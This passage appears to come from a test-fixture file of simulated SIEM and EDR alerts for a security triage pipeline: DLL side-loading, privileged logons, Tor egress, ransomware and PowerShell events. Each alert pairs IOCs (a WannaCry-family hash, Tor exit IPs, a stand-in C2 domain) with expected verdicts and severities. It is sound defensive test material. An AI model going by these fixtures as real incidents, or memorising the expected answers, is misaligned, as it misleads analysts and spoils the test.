    "connection_duration_seconds": 67
  },
  "iocs": [
    {"type": "ip", "value": "185.220.101.45",
     "pattern": "ti_tor_exit_real",
     "note": "Real active Tor exit node IP in the documented 185.220.101.0/24 range. TorProject directory confirms; GreyNoise tags as 'tor_exit_node'; AbuseIPDB confidence 100% for anonymizer abuse."}
  ],
  "compromised_asset": "MKT-LAPTOP-14.example.local",
  "expected_verdict": "SUSPICIOUS",
  "expected_disposition": "true_positive_requires_review",
  "expected_ti_sources": ["TorProject", "GreyNoise", "AbuseIPDB"],
  "expected_severity": "SEV2",
  "note": "Tor egress is a yellow-flag — could be insider exfil prep, could be a privacy-conscious analyst on legitimate browsing. Enrichment confirms the destination is Tor; the verdict (SUSPICIOUS vs CONFIRMED) depends on whether the org has a written Tor policy. Disposition recommender should escalate to human review."
}
""")

_ENRICH_E = _j(r"""
{
  "source": "QRadar",
  "event_type": "InternetScanReceived",
  "timestamp": "2026-06-09T17:48:30Z",
  "severity": "Low",
  "confidence": 70,
  "category": "117 Reconnaissance",
  "qradar_categories": ["External Scan", "Reconnaissance"],
  "alert": {
    "name": "Inbound scan from documented benign internet scanner",
    "description": "Edge firewall logged TCP SYN scan against perimeter from an IP GreyNoise tags as a 'benign internet scanner' (Shodan-style). Positive-control case for distinguishing 'attacker recon' from 'mass scanner background noise' — enrichment should drive the disposition recommender to auto-close as benign."
  },
  "host": {"hostname": "EDGE-FW-01.example.local", "ip": "203.0.113.10 (public-side perimeter)",
           "scope": "edge firewall logs only — no internal asset reached"},
  "network": {
    "source_ip": "71.6.146.185",
    "source_country": "US (Shodan-attributed)",
    "destination_subnet": "203.0.113.0/24",
    "ports_scanned": [80, 443, 8080, 22, 3389, 5985, 1433, 3306],
    "edge_drop": true,
    "no_internal_reach": true
  },
  "iocs": [
    {"type": "ip", "value": "71.6.146.185",
     "pattern": "ti_known_scanner",
     "note": "Shodan-affiliated mass scanner IP. GreyNoise tag: 'benign_scanner / Shodan.io'. AbuseIPDB confidence ~30 (low — scanner activity, not active abuse). No real C2 / no credentials harvested."}
  ],
  "compromised_asset": null,
  "expected_verdict": "BENIGN_AUTHORIZED",
  "expected_disposition": "false_positive_scanner_noise",
  "expected_ti_sources": ["GreyNoise", "Censys"],
  "expected_severity": "SEV5",
  "note": "Positive-control for benign-classification path. Enrichment SHOULD identify the IP as a documented scanner and the chain should auto-close as false_positive_scanner_noise. If a chain ever escalates a Shodan/Censys scan to SEV3+, the chain is too aggressive."
}
""")


# ── v6 SIEM-shape payloads — vendor-native raw log formats ────────
#
# Ten scenarios covering the 5 SIEM raw-log shapes a downstream consumer
# needs to correctly parse:
#
#   TRELLIX-A  — Trellix HX CEF (T1574.002 DLL side-loading)
#   WIN-4672   — QRadar WinCollect LEEF v2 (Event 4672 Special Privileges)
#   PA-SMB-A   — Palo Alto TRAFFIC CSV (outbound SMB aged-out — no real exchange)
#   PA-SMB-B   — Palo Alto TRAFFIC CSV variant (aged-out to Tor exit)
#   RANSOM-A   — Ransomware/APT with destructive-action IOCs
#   RANSOM-B   — Same as A but raw source-severity is "Low" (severity-floor test)
#   RANSOM-C   — Same as A but consumer-side severity override attempt (revert test)
#   PSH-A      — Windows Event 4688 — legitimate admin PowerShell (should score LOW)
#   PSH-B      — Windows Event 4688 — malicious encoded PowerShell (should score HIGH)
#   PSH-C      — Windows Event 4688 — encoded PowerShell WITHOUT persistence artifacts
#
# Each raw_alert ships:
#   raw_log.body     — the byte-identical SIEM output (CEF / LEEF / CSV / JSON)
#   raw_log.format   — indicator so consumers know which parser to invoke
#   parsed           — pre-parsed fields for consumers that don't want to re-parse
#   iocs             — pattern-tagged IOC list (same convention as DEMO/ENRICH)
#   expected_*       — what the consumer's downstream pipeline should produce

_TRELLIX_A = _j(r"""
{
  "source": "Trellix HX",
  "event_type": "EDR-Alert",
  "timestamp": "2026-07-05T04:15:22Z",
  "severity": "Critical",
  "confidence": 90,
  "category": "111 Endpoint Defense Evasion",
  "qradar_categories": ["Endpoint Defense Evasion", "Malware Signature Detection"],
  "alert": {
    "name": "DLL side-loading — malicious signature-based detection",
    "description": "EDR agent flagged an unsigned DLL loaded from a user-writable path (C:\\Users\\Public\\secur32.dll) by a signed agent process. Classic T1574.002 side-loading pattern. Signed process must NOT be blocked; hunt the sideloaded DLL."
  },
  "raw_log": {
    "format": "CEF",
    "syslog_wrapper": "<134>1 2026-07-05T04:15:22Z hx-collector-01 hx - - -",
    "body": "CEF:0|FireEye|HX|4.9.0|MPS-BLOCK-Executable|Malicious Signature-Based Detection|10|externalId=EX-12345 cs1Label=Detection Type cs1=EDR Alert cs2Label=Signature Name cs2=SUSPICIOUS_DLL_SIDE_LOADING_1 cs3Label=MITRE Technique cs3=T1574.002 cs4Label=Process Name cs4=xagt.exe cs5Label=Loaded DLL Path cs5=C:\\Users\\Public\\secur32.dll cs6Label=Loaded DLL Hash MD5 cs6=b5c0e18fc4c96c1e3a67feaddbc0d34d flexString1Label=Host Agent Cert Hash flexString1=fa1b8e3c9d7e2a5f8b1c4d7e0f2a3b6c8d9e1f2a4b7c9e0d3f5a8b2c1e4d7f9a suser=admin.user dvc=192.168.5.10 dvchost=WORKSTATION-EX-04"
  },
  "parsed": {
    "device_vendor": "FireEye",
    "device_product": "HX",
    "device_version": "4.9.0",
    "signature_id": "MPS-BLOCK-Executable",
    "name": "Malicious Signature-Based Detection",
    "severity_raw": 10,
    "external_id": "EX-12345",
    "detection_type": "EDR Alert",
    "signature_name": "SUSPICIOUS_DLL_SIDE_LOADING_1",
    "mitre_technique": "T1574.002",
    "process_name": "xagt.exe",
    "loaded_dll_path": "C:\\Users\\Public\\secur32.dll",
    "loaded_dll_md5": "b5c0e18fc4c96c1e3a67feaddbc0d34d",
    "host_agent_cert_hash": "fa1b8e3c9d7e2a5f8b1c4d7e0f2a3b6c8d9e1f2a4b7c9e0d3f5a8b2c1e4d7f9a",
    "user": "admin.user",
    "device_ip": "192.168.5.10",
    "device_host": "WORKSTATION-EX-04"
  },
  "iocs": [
    {"type": "process", "value": "xagt.exe", "pattern": "edr_agent_process",
     "note": "This is the EDR agent process itself — must NOT be blocked as malicious. The threat is the sideloaded DLL, not the signed loader."},
    {"type": "file_path", "value": "C:\\Users\\Public\\secur32.dll", "pattern": "user_writable_sideload_path",
     "note": "secur32.dll in a user-writable path is the anomaly signal. Legitimate secur32.dll lives in System32."},
    {"type": "hash_md5", "value": "b5c0e18fc4c96c1e3a67feaddbc0d34d", "pattern": "sideloaded_dll_hash"},
    {"type": "cert_hash", "value": "fa1b8e3c9d7e2a5f8b1c4d7e0f2a3b6c8d9e1f2a4b7c9e0d3f5a8b2c1e4d7f9a", "pattern": "agent_identity_marker",
     "note": "Host agent certificate hash — identifier for the EDR agent installation. Must NOT be enriched as an external IOC."}
  ],
  "expected_iti_category_id": 111,
  "expected_iti_category_name": "Endpoint Defense Evasion",
  "expected_iti_attack_severity": "SEV1",
  "expected_artifact_mapping": [
    {"am_name": "process", "am_value": "xagt.exe"},
    {"am_name": "file_path", "am_value": "C:\\Users\\Public\\secur32.dll"},
    {"am_name": "file_hash_md5", "am_value": "b5c0e18fc4c96c1e3a67feaddbc0d34d"},
    {"am_name": "hostname", "am_value": "WORKSTATION-EX-04"},
    {"am_name": "source_ip", "am_value": "192.168.5.10"},
    {"am_name": "user", "am_value": "admin.user"},
    {"am_name": "mitre_technique", "am_value": "T1574.002"}
  ],
  "expected_verdict": "MALICIOUS_CONFIRMED",
  "expected_disposition": "true_positive_confirmed_sideload",
  "expected_severity": "SEV1",
  "test_notes": "Signed EDR agent (xagt.exe) hosts a sideloaded DLL. Consumer must (a) treat xagt.exe as the loader, not the payload; (b) treat secur32.dll in user-writable path as the anomaly; (c) treat the host-agent cert hash as an installation identifier, NOT an IOC to enrich; (d) trigger contain + forensic-snapshot on T1574.002. Category MUST be Endpoint Defense Evasion (111), NOT Ransomware (107) — no encryption behaviors present."
}
""")

_WIN_4672 = _j(r"""
{
  "source": "QRadar WinCollect",
  "event_type": "WindowsSecurity-4672",
  "timestamp": "2026-07-05T04:30:00Z",
  "severity": "High",
  "confidence": 75,
  "category": "118 Privileged Access",
  "qradar_categories": ["Privileged Access", "User Behavior Analytics"],
  "alert": {
    "name": "Special privileges assigned to a new logon (Event 4672)",
    "description": "Windows Event 4672 — a logon session received sensitive privileges (SeDebugPrivilege, SeBackupPrivilege, SeLoadDriverPrivilege, and 6 more). Actor is a machine account (trailing $) on an Exchange server class host — expected for network-share machine-to-machine flows."
  },
  "raw_log": {
    "format": "LEEF",
    "syslog_wrapper": "<134>1 2026-07-05T04:30:00Z qradar-collector-01 QRadar - - -",
    "body": "LEEF:2.0|Microsoft|Windows|10.0|4672|^|devTime=2026-07-05T04:30:00Z^EventID=4672^Computer=EX-DC-01.acme.local^OriginatingComputer=EX-DC-01.acme.local^LogSource=WinCollect_DC01^DeviceType=WindowsAuthServer^Category=Special Logon^sev=6^usrName=EX-DC-01$^Domain=ACME^SecurityID=S-1-5-18^LogonType=3^LogonID=0x3E7^Privileges=SeSecurityPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege SeDebugPrivilege SeSystemEnvironmentPrivilege SeLoadDriverPrivilege SeImpersonatePrivilege SeDelegateSessionUserImpersonatePrivilege^PluginVersion=7.3.2.55^SourceIP=10.20.30.5"
  },
  "parsed": {
    "device_vendor": "Microsoft",
    "device_product": "Windows",
    "event_id": 4672,
    "computer": "EX-DC-01.acme.local",
    "log_source": "WinCollect_DC01",
    "category_raw": "Special Logon",
    "sev": 6,
    "user_name": "EX-DC-01$",
    "domain": "ACME",
    "security_id": "S-1-5-18",
    "logon_type": 3,
    "logon_id": "0x3E7",
    "privileges": [
      "SeSecurityPrivilege",
      "SeBackupPrivilege",
      "SeRestorePrivilege",
      "SeTakeOwnershipPrivilege",
      "SeDebugPrivilege",
      "SeSystemEnvironmentPrivilege",
      "SeLoadDriverPrivilege",
      "SeImpersonatePrivilege",
      "SeDelegateSessionUserImpersonatePrivilege"
    ],
    "plugin_version": "7.3.2.55",
    "source_ip": "10.20.30.5"
  },
  "iocs": [
    {"type": "user", "value": "EX-DC-01$", "pattern": "machine_account_naming",
     "note": "Trailing $ + host-name-shaped user = Windows machine account. Machine accounts holding SeDebugPrivilege is normal for domain controllers + Exchange servers."},
    {"type": "hostname", "value": "EX-DC-01.acme.local", "pattern": "exchange_server_class_hostname",
     "note": "The EX-DC- prefix marks this as an Exchange server. Class context matters for privilege interpretation."},
    {"type": "ip", "value": "10.20.30.5", "pattern": "internal_corp_source",
     "note": "Internal source IP for the logon — expected for LogonType=3 (network share)."}
  ],
  "expected_iti_category_id": 118,
  "expected_iti_category_name": "Privileged Access",
  "expected_iti_attack_severity": "SEV1",
  "expected_artifact_mapping": [
    {"am_name": "user", "am_value": "EX-DC-01$"},
    {"am_name": "hostname", "am_value": "EX-DC-01.acme.local"},
    {"am_name": "source_ip", "am_value": "10.20.30.5"},
    {"am_name": "logon_type", "am_value": "3"},
    {"am_name": "logon_id", "am_value": "0x3E7"},
    {"am_name": "event_id", "am_value": "4672"},
    {"am_name": "domain", "am_value": "ACME"}
  ],
  "expected_verdict": "VERIFICATION_REQUIRED",
  "expected_disposition": "true_positive_expected_privilege",
  "expected_severity": "SEV1",
  "test_notes": "Consumer must (a) recognize trailing $ + host-name-shape as machine account (not user account); (b) cite EACH named privilege in the analysis narrative (nine privileges present — narrative must not summarize as 'sensitive privileges' and drop them); (c) interpret LogonType=3 as network share (correct context for machine-to-machine flows); (d) treat PluginVersion=7.3.2.55 as the WinCollect agent version, NOT as an IOC to extract; (e) map to T1078 (valid accounts / elevation) — the EX- server class + machine account combo is expected behavior, not compromise."
}
""")

_PA_SMB_A = _j(r"""
{
  "source": "Palo Alto Networks PAN-OS",
  "event_type": "TRAFFIC-end",
  "timestamp": "2026-07-05T05:12:44Z",
  "severity": "Low",
  "confidence": 40,
  "category": "110 Network Anomaly",
  "qradar_categories": ["Network Anomaly", "Firewall Traffic"],
  "alert": {
    "name": "Outbound TCP/445 session aged-out — no real exchange",
    "description": "Palo Alto TRAFFIC log for an outbound flow to TCP/445 that App-ID could not classify (app=incomplete) and that ended aged-out with only 2 packets and 140 bytes each way. Consumer must NOT infer 'outbound SMB' from the port alone — the session died before any Layer-7 handshake happened."
  },
  "raw_log": {
    "format": "PaloAlto-TRAFFIC-CSV",
    "syslog_wrapper": "<134>1 2026-07-05T05:12:44Z pa-fw - - - 1",
    "body": "1,2026-07-05T05:12:44Z,000000000000,TRAFFIC,end,2626,2026-07-05T05:12:44Z,192.168.247.34,20.119.84.212,103.111.84.49,20.119.84.212,WiFi-Internet-Access,,,incomplete,vsys1,DMZ-WLC-01,External,ae1.1205,ae3.50,LOG-PROFILE,2026-07-05T05:12:44Z,2440026,1,64710,445,36288,445,0x404019,tcp,allow,140,140,140,2,2026-07-05T05:12:44Z,0,any,aged-out,0,0,0,0,,fw-edge-01,from-policy,,,0,,0,,N/A,0,0,0,0,NonProxyTraffic"
  },
  "parsed": {
    "type": "TRAFFIC",
    "subtype": "end",
    "src": "192.168.247.34",
    "dst": "20.119.84.212",
    "natsrc": "103.111.84.49",
    "natdst": "20.119.84.212",
    "rule": "WiFi-Internet-Access",
    "srcuser": null,
    "dstuser": null,
    "app": "incomplete",
    "vsys": "vsys1",
    "from_zone": "DMZ-WLC-01",
    "to_zone": "External",
    "inbound_if": "ae1.1205",
    "outbound_if": "ae3.50",
    "sessionid": 2440026,
    "sport": 64710,
    "dport": 445,
    "natsport": 36288,
    "natdport": 445,
    "proto": "tcp",
    "action": "allow",
    "bytes": 140,
    "bytes_sent": 140,
    "bytes_received": 140,
    "packets": 2,
    "packets_sent": 2,
    "packets_received": 2,
    "elapsed": 0,
    "session_end_reason": "aged-out",
    "device_name": "fw-edge-01",
    "traffic_type": "NonProxyTraffic"
  },
  "iocs": [
    {"type": "ip", "value": "20.119.84.212", "pattern": "external_destination",
     "note": "Azure IP range. Public-TI enrichment will likely tag as Microsoft cloud — evaluate destination on its own merits, but do NOT infer SMB abuse from the port."},
    {"type": "ip", "value": "192.168.247.34", "pattern": "internal_corp_source"},
    {"type": "port", "value": "445", "pattern": "smb_port_no_layer7",
     "note": "Port 445 in isolation does NOT mean SMB. This session had no Layer-7 classification (app=incomplete) and ended aged-out — no real exchange."}
  ],
  "expected_iti_category_id": 110,
  "expected_iti_category_name": "Network Anomaly",
  "expected_iti_attack_severity": "SEV4",
  "expected_artifact_mapping": [
    {"am_name": "source_ip", "am_value": "192.168.247.34"},
    {"am_name": "destination_ip", "am_value": "20.119.84.212"},
    {"am_name": "destination_port", "am_value": "445"},
    {"am_name": "protocol", "am_value": "tcp"},
    {"am_name": "app_id", "am_value": "incomplete"},
    {"am_name": "session_end_reason", "am_value": "aged-out"}
  ],
  "expected_verdict": "BENIGN_AUTHORIZED",
  "expected_disposition": "false_positive_no_real_exchange",
  "expected_severity": "SEV4",
  "test_notes": "Consumer must narrate 'session died before any real handshake — no real SMB exchange occurred' rather than 'outbound SMB detected'. Semantic pins: (a) session_end_reason=aged-out means no reset, no FIN — the connection never completed; (b) bytes_sent=140 + bytes_received=140 + packets_sent=2 + packets_received=2 = small symmetric footprint consistent with SYN+RST or SYN+ACK+SYN+RST, not payload transfer; (c) app=incomplete means Palo Alto's App-ID engine never classified the Layer-7 protocol — Port 445 alone is NOT SMB. Disposition should close as false_positive_no_real_exchange."
}
""")

_PA_SMB_B = _j(r"""
{
  "source": "Palo Alto Networks PAN-OS",
  "event_type": "TRAFFIC-end",
  "timestamp": "2026-07-05T05:24:11Z",
  "severity": "High",
  "confidence": 75,
  "category": "110 Network Anomaly",
  "qradar_categories": ["Network Anomaly", "Tor Egress"],
  "alert": {
    "name": "Outbound TCP/445 aged-out to Tor exit node",
    "description": "Same firewall shape as PA-SMB-A (aged-out, no real Layer-7 exchange) BUT the destination IP is a known Tor exit node. Enrichment identifies the destination independently of the flow content. Consumer must separate the two signals: 'no real exchange' (flow semantics) + 'destination is Tor exit' (enrichment)."
  },
  "raw_log": {
    "format": "PaloAlto-TRAFFIC-CSV",
    "syslog_wrapper": "<134>1 2026-07-05T05:24:11Z pa-fw - - - 1",
    "body": "1,2026-07-05T05:24:11Z,000000000000,TRAFFIC,end,2626,2026-07-05T05:24:11Z,192.168.247.34,185.220.101.34,103.111.84.49,185.220.101.34,WiFi-Internet-Access,,,incomplete,vsys1,DMZ-WLC-01,External,ae1.1205,ae3.50,LOG-PROFILE,2026-07-05T05:24:11Z,2440511,1,64712,445,36290,445,0x404019,tcp,allow,140,140,140,2,2026-07-05T05:24:11Z,0,any,aged-out,0,0,0,0,,fw-edge-01,from-policy,,,0,,0,,N/A,0,0,0,0,NonProxyTraffic"
  },
  "parsed": {
    "type": "TRAFFIC",
    "subtype": "end",
    "src": "192.168.247.34",
    "dst": "185.220.101.34",
    "app": "incomplete",
    "dport": 445,
    "proto": "tcp",
    "action": "allow",
    "bytes_sent": 140,
    "bytes_received": 140,
    "packets_sent": 2,
    "packets_received": 2,
    "session_end_reason": "aged-out"
  },
  "iocs": [
    {"type": "ip", "value": "185.220.101.34", "pattern": "ti_tor_exit_real",
     "note": "Real Tor exit node — TorProject directory + GreyNoise + AbuseIPDB all confirm. This is the load-bearing enrichment signal, INDEPENDENT of the aged-out flow semantics."},
    {"type": "ip", "value": "192.168.247.34", "pattern": "internal_corp_source"},
    {"type": "port", "value": "445", "pattern": "smb_port_no_layer7"}
  ],
  "expected_iti_category_id": 110,
  "expected_iti_category_name": "Network Anomaly",
  "expected_iti_attack_severity": "SEV2",
  "expected_ti_sources": ["TorProject", "GreyNoise", "AbuseIPDB"],
  "expected_verdict": "SUSPICIOUS",
  "expected_disposition": "true_positive_requires_review",
  "expected_severity": "SEV2",
  "test_notes": "Two independent signals with opposite implications: (a) flow semantics: aged-out + app=incomplete + tiny symmetric bytes = no real exchange (would default to BENIGN in PA-SMB-A); (b) destination: real Tor exit IP that public TI reliably tags. Consumer must NOT auto-close as false-positive despite the aged-out signal — the Tor destination alone warrants human review. This tests whether the pipeline correctly composites 'flow-shape says nothing happened' + 'destination is Tor' → SUSPICIOUS, not either extreme."
}
""")

_RANSOM_A = _j(r"""
{
  "source": "CrowdStrike Falcon (via OmniStream)",
  "event_type": "RansomwareBehaviorDetection",
  "timestamp": "2026-07-05T05:45:33Z",
  "severity": "Critical",
  "confidence": 95,
  "category": "107 Ransomware",
  "qradar_categories": ["Ransomware", "Malware Outbreak"],
  "alert": {
    "name": "Ransomware behavior — encryption + shadow-copy deletion + C2",
    "description": "EDR observed the full ransomware kill-chain on SOLUTION-01: mass file encryption, shadow-copy deletion via vssadmin, ransom note dropped (READMEDEC.txt), C2 callback to an external IP. SHA-256 matches a known WannaCry-family sample. Consumer must trigger destructive-action approvals (contain host, block IP, block domain, block hash)."
  },
  "raw_log": {
    "format": "JSON",
    "envelope": "OmniStream ingested",
    "body": {
      "device_id": "sol-crowdstrike-01",
      "device_hostname": "SOLUTION-01",
      "detect_ts": "2026-07-05T05:45:33Z",
      "process": {
        "filename": "svchost.exe",
        "cmdline": "svchost.exe -k netsvcs -p -s Schedule",
        "sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
        "parent_process": "explorer.exe"
      },
      "network": {
        "remote_ip": "39.39.125.108",
        "remote_port": 443,
        "domain": "malicious-c2.badactor.example",
        "connection_direction": "outbound"
      },
      "behaviors": {
        "file_mass_encryption": true,
        "shadow_copy_deletion": true,
        "ransom_note_dropped": "READMEDEC.txt",
        "encryption_extension": ".WNCRY"
      }
    }
  },
  "parsed": {
    "device_hostname": "SOLUTION-01",
    "device_id": "sol-crowdstrike-01",
    "process_name": "svchost.exe",
    "process_cmdline": "svchost.exe -k netsvcs -p -s Schedule",
    "process_sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
    "parent_process": "explorer.exe",
    "remote_ip": "39.39.125.108",
    "remote_port": 443,
    "c2_domain": "malicious-c2.badactor.example",
    "file_mass_encryption": true,
    "shadow_copy_deletion": true,
    "ransom_note_dropped": "READMEDEC.txt"
  },
  "iocs": [
    {"type": "hash_sha256", "value": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
     "pattern": "ti_known_wannacry",
     "note": "Real WannaCry-family SHA-256 — VirusTotal + AlienVault OTX + ThreatFox + MalwareBazaar all attribute. Same hash as ENRICH-A."},
    {"type": "ip", "value": "39.39.125.108", "pattern": "external_c2_candidate",
     "note": "External destination IP. Enrichment should attempt attribution; may or may not be pre-catalogued in public TI."},
    {"type": "domain", "value": "malicious-c2.badactor.example", "pattern": "fictional_c2",
     "note": "Fictional domain for the scenario — won't be catalogued by public TI, but the parsed shape (newly-observed + connecting to an external IP) is the behavioral anchor."}
  ],
  "expected_iti_category_id": 107,
  "expected_iti_category_name": "Ransomware",
  "expected_iti_attack_severity": "SEV1",
  "expected_artifact_mapping": [
    {"am_name": "hostname", "am_value": "SOLUTION-01"},
    {"am_name": "process", "am_value": "svchost.exe"},
    {"am_name": "process_cmdline", "am_value": "svchost.exe -k netsvcs -p -s Schedule"},
    {"am_name": "file_hash_sha256", "am_value": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"},
    {"am_name": "destination_ip", "am_value": "39.39.125.108"},
    {"am_name": "destination_port", "am_value": "443"},
    {"am_name": "domain", "am_value": "malicious-c2.badactor.example"}
  ],
  "expected_verdict": "MALICIOUS_CONFIRMED",
  "expected_disposition": "true_positive_confirmed_ransomware",
  "expected_severity": "SEV1",
  "expected_destructive_actions": [
    "contain_host",
    "block_ip",
    "block_domain",
    "block_hash"
  ],
  "test_notes": "Baseline ransomware payload with all three behavioral prerequisites for the Ransomware category: file_mass_encryption + shadow_copy_deletion + ransom_note_dropped. Downstream Planner should propose 4 destructive actions (contain / block IP / block domain / block hash). Category MUST be Ransomware (107) — a category-107 verdict on a payload without encryption behaviors would be a false floor; a non-107 verdict here means the guardrail is too aggressive."
}
""")

_RANSOM_B = _j(r"""
{
  "source": "CrowdStrike Falcon (via OmniStream)",
  "event_type": "RansomwareBehaviorDetection",
  "timestamp": "2026-07-05T05:47:11Z",
  "severity": "Low",
  "confidence": 50,
  "category": "107 Ransomware",
  "qradar_categories": ["Ransomware", "Malware Outbreak"],
  "alert": {
    "name": "Ransomware behavior detected — source severity understated",
    "description": "Same ransomware kill-chain as RANSOM-A but the source sensor labelled it 'Low' severity. Consumer must apply category-floor logic: any confirmed Ransomware (Cat 107) with encryption + shadow-copy deletion + ransom-note evidence should floor to SEV2 minimum regardless of the raw source label."
  },
  "raw_log": {
    "format": "JSON",
    "envelope": "OmniStream ingested",
    "body": {
      "device_hostname": "SOLUTION-02",
      "detect_ts": "2026-07-05T05:47:11Z",
      "raw_source_severity": "Low",
      "process": {
        "filename": "svchost.exe",
        "sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
      },
      "network": {
        "remote_ip": "39.39.125.108",
        "domain": "malicious-c2.badactor.example"
      },
      "behaviors": {
        "file_mass_encryption": true,
        "shadow_copy_deletion": true,
        "ransom_note_dropped": "READMEDEC.txt"
      }
    }
  },
  "parsed": {
    "raw_source_severity": "Low",
    "device_hostname": "SOLUTION-02",
    "process_sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
    "file_mass_encryption": true,
    "shadow_copy_deletion": true,
    "ransom_note_dropped": "READMEDEC.txt"
  },
  "iocs": [
    {"type": "hash_sha256", "value": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "pattern": "ti_known_wannacry"},
    {"type": "ip", "value": "39.39.125.108", "pattern": "external_c2_candidate"},
    {"type": "domain", "value": "malicious-c2.badactor.example", "pattern": "fictional_c2"}
  ],
  "expected_iti_category_id": 107,
  "expected_iti_category_name": "Ransomware",
  "expected_iti_attack_severity": "SEV2",
  "expected_severity_before_floor": "Low",
  "expected_severity": "SEV2",
  "test_notes": "Category-floor test: the raw source labelled this ransomware event 'Low' severity, but the consumer's severity-floor policy should recognize that any Cat-107 (Ransomware) event with all three behavioral anchors present (encryption + shadow_copy_deletion + ransom_note_dropped) must floor to at least SEV2 regardless of the source label. If the final iti_attack_severity is SEV3+ (raw label wins) the floor is broken; if it's SEV2 (floor applied) the test passes."
}
""")

_RANSOM_C = _j(r"""
{
  "source": "CrowdStrike Falcon (via OmniStream)",
  "event_type": "RansomwareBehaviorDetection",
  "timestamp": "2026-07-05T05:49:22Z",
  "severity": "Critical",
  "confidence": 95,
  "category": "107 Ransomware",
  "qradar_categories": ["Ransomware", "Malware Outbreak"],
  "alert": {
    "name": "Ransomware — source SEV1 to test unjustified-override revert",
    "description": "Same ransomware payload as RANSOM-A with source severity SEV1. Tests the unjustified-override revert: if a downstream stage attempts to demote to a lower severity WITHOUT providing severity_override_reason, the consumer's revert policy should restore SEV1 and record the reverted-from value."
  },
  "raw_log": {
    "format": "JSON",
    "envelope": "OmniStream ingested",
    "body": {
      "device_hostname": "SOLUTION-03",
      "detect_ts": "2026-07-05T05:49:22Z",
      "raw_source_severity": "Critical",
      "raw_source_severity_mapped": "SEV1",
      "process": {
        "filename": "svchost.exe",
        "sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa"
      },
      "network": {
        "remote_ip": "39.39.125.108",
        "domain": "malicious-c2.badactor.example"
      },
      "behaviors": {
        "file_mass_encryption": true,
        "shadow_copy_deletion": true,
        "ransom_note_dropped": "READMEDEC.txt"
      }
    }
  },
  "parsed": {
    "raw_source_severity": "Critical",
    "raw_source_severity_mapped": "SEV1",
    "device_hostname": "SOLUTION-03",
    "process_sha256": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa",
    "file_mass_encryption": true,
    "shadow_copy_deletion": true,
    "ransom_note_dropped": "READMEDEC.txt"
  },
  "iocs": [
    {"type": "hash_sha256", "value": "ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa", "pattern": "ti_known_wannacry"},
    {"type": "ip", "value": "39.39.125.108", "pattern": "external_c2_candidate"},
    {"type": "domain", "value": "malicious-c2.badactor.example", "pattern": "fictional_c2"}
  ],
  "expected_iti_category_id": 107,
  "expected_iti_category_name": "Ransomware",
  "expected_iti_attack_severity": "SEV1",
  "expected_severity": "SEV1",
  "test_scenario_override_attempt": "A downstream stage attempts to write iti_attack_severity=SEV3 with severity_override_reason='' (empty)",
  "test_notes": "Unjustified-override revert test: the source correctly ingests as SEV1. A downstream stage (LLM classification, in this scenario) attempts to demote to SEV3 but the override_reason field is empty. The consumer's revert policy should (a) reject the unjustified demote, (b) restore SEV1, (c) populate severity_override_reverted_from='SEV3' so downstream reviewers can see the attempted-but-reverted transition. Final iti_attack_severity must be SEV1."
}
""")

_PSH_A = _j(r"""
{
  "source": "QRadar WinCollect",
  "event_type": "WindowsSecurity-4688",
  "timestamp": "2026-07-05T06:00:00Z",
  "severity": "Informational",
  "confidence": 20,
  "category": "119 Process Execution",
  "qradar_categories": ["Process Execution", "Windows Audit"],
  "alert": {
    "name": "PowerShell process created — legitimate admin script",
    "description": "Windows Event 4688 — powershell.exe created a process to run an internal Corp-IT inventory script from ProgramData. Parent is chocolatey. Legitimate patrolman-of-hosts pattern. Consumer must recognize the co-signal-absent shape and NOT inflate the score."
  },
  "raw_log": {
    "format": "WindowsEventLog-4688",
    "syslog_wrapper": "<134>1 2026-07-05T06:00:00Z winhost - - - -",
    "body": "EventID=4688 Computer=WKS-CORP-102 ProcessName=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine=powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\CorpIT\\Scripts\\Get-Inventory.ps1 -OutputPath C:\\ProgramData\\CorpIT\\Reports\\ User=CORP\\svc_inventory ParentProcess=C:\\ProgramData\\Chocolatey\\bin\\choco.exe"
  },
  "parsed": {
    "event_id": 4688,
    "computer": "WKS-CORP-102",
    "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\ProgramData\\CorpIT\\Scripts\\Get-Inventory.ps1 -OutputPath C:\\ProgramData\\CorpIT\\Reports\\",
    "user": "CORP\\svc_inventory",
    "parent_process": "C:\\ProgramData\\Chocolatey\\bin\\choco.exe",
    "has_encoded_command": false,
    "has_download_cradle": false,
    "has_lolbin_pattern": false
  },
  "iocs": [
    {"type": "process", "value": "powershell.exe", "pattern": "shell_process_no_cosignal",
     "note": "PowerShell alone is not suspicious. Must not inflate score without co-signals (encoded-command, LOLBin pattern, download cradle, or persistence artifact)."},
    {"type": "user", "value": "CORP\\svc_inventory", "pattern": "service_account_scheduled",
     "note": "Service account naming (svc_ prefix) — consistent with scheduled inventory task."},
    {"type": "process_parent", "value": "choco.exe", "pattern": "package_manager_parent"}
  ],
  "expected_iti_category_id": 119,
  "expected_iti_category_name": "Process Execution",
  "expected_iti_attack_severity": "SEV5",
  "expected_score_breakdown": {
    "suspicious_process": 0,
    "encoded_command": 0,
    "lolbin_pattern": 0,
    "note": "PowerShell present but no co-signals → shell_process_no_cosignal breadcrumb at 0 points. Score does NOT inflate."
  },
  "expected_verdict": "BENIGN_AUTHORIZED",
  "expected_disposition": "false_positive_benign_admin_activity",
  "expected_severity": "SEV5",
